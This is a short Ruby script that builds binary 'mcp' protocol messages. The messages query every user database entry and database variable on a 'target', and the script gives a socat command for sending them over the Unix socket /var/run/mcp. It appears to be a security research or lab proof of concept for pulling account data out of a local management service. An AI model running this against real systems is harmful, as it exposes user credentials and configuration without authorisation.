require './mcp-builder.rb'

$stderr.puts("Writing an `mcp` message to stdout that'll query for interesting stuff")
$stderr.puts("Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin")
$stderr.puts

print build_packet(
  build('query_all', 'structure', [
    build('userdb_entry', 'structure', [])
  ])
)

print build_packet(
  build('query_all', 'structure', [
    build('db_variable', 'structure', [])
  ])
)
